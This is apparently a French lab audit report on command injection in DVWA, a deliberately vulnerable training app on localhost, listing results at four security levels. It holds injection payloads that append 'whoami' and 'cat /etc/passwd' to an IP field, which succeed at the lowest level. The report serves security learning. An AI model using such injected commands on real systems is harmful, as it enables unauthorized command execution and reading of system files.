
# Command Injection - Rapport d'audit

**Catégorie OWASP Top 10** : A03:2021 - Injection
**Sévérité** : Critique
**URL testée** : http://localhost/DVWA/vulnerabilities/exec/
**Date du test** : 06/07/2026

---

## Messages observés

**Succès** :
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.204 ms
...

**Échec** :
(Aucun message d'erreur spécifique)

---

## Résultats des tests

### Niveau LOW

**Test 1 : Commande normale**
- Payload : 127.0.0.1
- Résultat : Ping normal

**Test 2 : Injection de commande**
- Payload : 127.0.0.1; whoami
- Résultat : www-data

**Test 3 : Lecture de fichier**
- Payload : 127.0.0.1; cat /etc/passwd
- Résultat : Contenu du fichier /etc/passwd

---

### Niveau MEDIUM
**Test 1 : Commande normale**
- Payload : 127.0.0.1
- Résultat : Ping normal

**Test 2 : Injection de commande**
- Payload : 127.0.0.1; whoami
- Résultat : RIEN

**Test 3 : Lecture de fichier**
- Payload : 127.0.0.1; cat /etc/passwd
- Résultat : RIEN

---

### Niveau HIGH

**Test 1 : Commande normale**
- Payload : 127.0.0.1
- Résultat : Ping normal

**Test 2 : Injection de commande**
- Payload : 127.0.0.1; whoami
- Résultat : RIEN

**Test 3 : Lecture de fichier**
- Payload : 127.0.0.1; cat /etc/passwd
- Résultat : RIEN

---

### Niveau IMPOSSIBLE

**Test 1 : Commande normale**
- Payload : 127.0.0.1
- Résultat : Ping normal

**Test 2 : Injection de commande**
- Payload : 127.0.0.1; whoami
- Résultat : ERROR: You have entered an invalid IP.

**Test 3 : Lecture de fichier**
- Payload : 127.0.0.1; cat /etc/passwd
- Résultat : ERROR: You have entered an invalid IP.

---

